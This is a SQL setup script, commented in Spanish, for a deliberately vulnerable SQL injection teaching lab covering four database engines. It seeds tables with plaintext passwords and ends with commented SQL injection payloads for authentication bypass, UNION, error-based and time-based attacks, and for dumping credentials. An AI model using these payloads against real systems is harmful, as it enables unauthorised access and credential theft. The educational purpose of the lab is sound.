-- SQL Injection Demo - Database Setup Scripts
-- ⚠️ ADVERTENCIA: Solo para fines educativos

-- =============================================
-- MySQL Setup
-- =============================================

-- MySQL: Crear base de datos
CREATE DATABASE IF NOT EXISTS vulnerable_db;
USE vulnerable_db;

-- MySQL: Crear tabla de usuarios
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- MySQL: Insertar datos de ejemplo
INSERT INTO users (username, password, email) VALUES
('admin', 'admin123', 'admin@example.com'),
('user1', 'password123', 'user1@example.com'),
('user2', 'secret456', 'user2@example.com'),
('test', 'test123', 'test@example.com');

-- MySQL: Crear tabla de productos
CREATE TABLE IF NOT EXISTS products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10,2) NOT NULL,
    description TEXT,
    category VARCHAR(50)
);

-- MySQL: Insertar productos de ejemplo
INSERT INTO products (name, price, description, category) VALUES
('Laptop', 999.99, 'High performance laptop', 'Electronics'),
('Mouse', 29.99, 'Wireless mouse', 'Electronics'),
('Keyboard', 59.99, 'Mechanical keyboard', 'Electronics'),
('Monitor', 299.99, '27 inch monitor', 'Electronics');


-- =============================================
-- PostgreSQL Setup
-- =============================================

-- PostgreSQL Setup
-- Crear tabla de usuarios
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Insertar datos de ejemplo
INSERT INTO users (username, password, email) VALUES
('admin', 'admin123', 'admin@example.com'),
('user1', 'password123', 'user1@example.com'),
('user2', 'secret456', 'user2@example.com'),
('test', 'test123', 'test@example.com');

-- Crear tabla de productos
CREATE TABLE IF NOT EXISTS products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10,2) NOT NULL,
    description TEXT,
    category VARCHAR(50)
);

-- Insertar productos de ejemplo
INSERT INTO products (name, price, description, category) VALUES
('Laptop', 999.99, 'High performance laptop', 'Electronics'),
('Mouse', 29.99, 'Wireless mouse', 'Electronics'),
('Keyboard', 59.99, 'Mechanical keyboard', 'Electronics'),
('Monitor', 299.99, '27 inch monitor', 'Electronics');

-- =============================================
-- SQL Server Setup
-- =============================================

-- SQL Server: Crear base de datos
-- CREATE DATABASE vulnerable_db;
-- GO
-- USE vulnerable_db;

-- SQL Server: Crear tabla de usuarios
CREATE TABLE users (
    id INT IDENTITY(1,1) PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    email VARCHAR(100) NOT NULL,
    created_at DATETIME DEFAULT GETDATE()
);

-- SQL Server: Insertar datos de ejemplo
INSERT INTO users (username, password, email) VALUES
('admin', 'admin123', 'admin@example.com'),
('user1', 'password123', 'user1@example.com'),
('user2', 'secret456', 'user2@example.com'),
('test', 'test123', 'test@example.com');

-- SQL Server: Crear tabla de productos
CREATE TABLE products (
    id INT IDENTITY(1,1) PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    price DECIMAL(10,2) NOT NULL,
    description TEXT,
    category VARCHAR(50)
);

-- SQL Server: Insertar productos de ejemplo
INSERT INTO products (name, price, description, category) VALUES
('Laptop', 999.99, 'High performance laptop', 'Electronics'),
('Mouse', 29.99, 'Wireless mouse', 'Electronics'),
('Keyboard', 59.99, 'Mechanical keyboard', 'Electronics'),
('Monitor', 299.99, '27 inch monitor', 'Electronics');

-- =============================================
-- Oracle Setup
-- =============================================

-- Oracle: Crear tabla de usuarios
CREATE TABLE users (
    id NUMBER GENERATED BY DEFAULT AS IDENTITY PRIMARY KEY,
    username VARCHAR2(50) NOT NULL,
    password VARCHAR2(50) NOT NULL,
    email VARCHAR2(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Oracle: Insertar datos de ejemplo
INSERT INTO users (username, password, email) VALUES
('admin', 'admin123', 'admin@example.com');
INSERT INTO users (username, password, email) VALUES
('user1', 'password123', 'user1@example.com');
INSERT INTO users (username, password, email) VALUES
('user2', 'secret456', 'user2@example.com');
INSERT INTO users (username, password, email) VALUES
('test', 'test123', 'test@example.com');

-- Oracle: Crear tabla de productos
CREATE TABLE products (
    id NUMBER GENERATED BY DEFAULT AS IDENTITY PRIMARY KEY,
    name VARCHAR2(100) NOT NULL,
    price NUMBER(10,2) NOT NULL,
    description CLOB,
    category VARCHAR2(50)
);

-- Oracle: Insertar productos de ejemplo
INSERT INTO products (name, price, description, category) VALUES
('Laptop', 999.99, 'High performance laptop', 'Electronics');
INSERT INTO products (name, price, description, category) VALUES
('Mouse', 29.99, 'Wireless mouse', 'Electronics');
INSERT INTO products (name, price, description, category) VALUES
('Keyboard', 59.99, 'Mechanical keyboard', 'Electronics');
INSERT INTO products (name, price, description, category) VALUES
('Monitor', 299.99, '27 inch monitor', 'Electronics');

-- =============================================
-- Queries de Prueba para SQL Injection
-- =============================================

-- Ejemplos de queries para probar SQL Injection:

-- 1. Bypass de autenticación
-- SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'password'

-- 2. Union attack
-- SELECT * FROM users WHERE username = '' UNION SELECT 1,2,3,4,5 --

-- 3. Error based injection
-- SELECT * FROM users WHERE username = '' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

-- 4. Time based injection
-- SELECT * FROM users WHERE username = '' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --

-- 5. Dump de tablas
-- SELECT * FROM users WHERE username = '' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables --

-- 6. Dump de columnas
-- SELECT * FROM users WHERE username = '' UNION SELECT column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --

-- 7. Dump de datos
-- SELECT * FROM users WHERE username = '' UNION SELECT username,password,email,NULL,NULL FROM users --

-- =============================================
-- Notas Importantes
-- =============================================

/*
⚠️ ADVERTENCIA: Esta aplicación es vulnerable por diseño para fines educativos.

Vulnerabilidades implementadas:
1. Concatenación directa de strings en queries SQL
2. Falta de sanitización de entrada
3. Exposición de errores de base de datos
4. No uso de prepared statements
5. Falta de validación de entrada

Para usar en producción, implementar:
1. Prepared statements
2. Validación de entrada
3. Sanitización de datos
4. Principio de mínimo privilegio
5. Logging de seguridad
6. Rate limiting
7. Web Application Firewall (WAF)
*/ 
